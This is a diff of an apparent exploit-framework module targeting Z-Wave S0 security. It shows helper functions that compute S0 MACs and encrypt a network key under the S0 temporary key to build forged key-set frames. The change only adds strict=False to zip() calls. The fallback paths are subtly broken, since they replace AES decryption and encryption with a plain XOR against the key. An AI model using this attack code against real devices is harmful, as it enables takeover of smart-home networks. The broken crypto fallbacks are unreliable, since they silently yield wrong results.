@@ -36,7 +36,7 @@ def _aes_ofb_decrypt(key, iv, ciphertext):
         dec = cipher.decryptor()
         return dec.update(ciphertext) + dec.finalize()
     except ImportError:
-        return bytes(a ^ b for a, b in zip(ciphertext, _ZWAVE_S0_TEMP_KEY * (len(ciphertext) // 16 + 1)))
+        return bytes(a ^ b for a, b in zip(ciphertext, _ZWAVE_S0_TEMP_KEY * (len(ciphertext) // 16 + 1), strict=False))
 
 
 def _aes_ecb_encrypt(key, block):
@@ -51,13 +51,13 @@ def _aes_ecb_encrypt(key, block):
 
 def _compute_s0_mac(key, data, nonce_sender, nonce_receiver):
     """Compute S0 MAC (AES-CBCMAC com XOR de nonces)."""
-    iv = bytes(a ^ b for a, b in zip(nonce_sender[:8] + b"\x00" * 8, nonce_receiver[:8] + b"\x00" * 8))
+    iv = bytes(a ^ b for a, b in zip(nonce_sender[:8] + b"\x00" * 8, nonce_receiver[:8] + b"\x00" * 8, strict=False))
     mac_input = iv + data
     if len(mac_input) % 16 != 0:
         mac_input += b"\x00" * (16 - len(mac_input) % 16)
     block = b"\x00" * 16
     for i in range(0, len(mac_input), 16):
-        xored = bytes(a ^ b for a, b in zip(block, mac_input[i:i+16]))
+        xored = bytes(a ^ b for a, b in zip(block, mac_input[i:i+16], strict=False))
         block = _aes_ecb_encrypt(key, xored)
     return block[:8]
 
@@ -120,7 +120,7 @@ class Exploit(Exploit):
             enc = cipher.encryptor()
             encrypted_key = enc.update(network_key) + enc.finalize()
         except ImportError:
-            encrypted_key = bytes(a ^ b for a, b in zip(network_key, _ZWAVE_S0_TEMP_KEY))
+            encrypted_key = bytes(a ^ b for a, b in zip(network_key, _ZWAVE_S0_TEMP_KEY, strict=False))
         mac = _compute_s0_mac(_ZWAVE_S0_TEMP_KEY, encrypted_key, nonce_controller, nonce_device)
         key_set_frame = struct.pack("BB", _CMD_CLASS_SECURITY, _SECURITY_MSG_ENCAP)
         key_set_frame += nonce_controller + encrypted_key + nonce_device[:1] + mac
